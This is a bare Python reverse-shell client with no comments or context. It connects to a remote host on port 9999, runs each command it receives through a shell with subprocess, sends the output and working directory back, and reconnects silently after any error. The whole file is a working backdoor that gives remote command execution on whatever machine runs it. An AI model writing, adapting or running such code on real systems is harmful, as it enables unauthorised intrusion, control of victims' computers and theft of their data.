import socket, os, subprocess

s = socket.socket()

HOST = ""
PORT = 9999

s.connect((HOST, PORT))

while True:
    try:
        data = s.recv(1024)
        print(data)
        if data.decode("utf-8") == "":
            current_dir = "$" + os.getcwd() + ">"

            s.send(str.encode(current_dir))

        elif data[:2].decode("utf-8") == "cd":
            PATH = data[3:].decode("utf-8")
            current_dir = ''
            if os.path.exists(PATH):
                os.chdir(data[3:].decode("utf-8"))
                current_dir = "$" + os.getcwd() + ">"
            else:
                current_dir = "Folder doesn't exists.\n" + "$" + os.getcwd() + ">"

            s.send(str.encode(current_dir))

        else:
            cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            current_dir = "$" + os.getcwd() + ">"

            s.send(str.encode(output_str + current_dir))
    except:
        s = socket.socket()
        s.connect((HOST, PORT))
        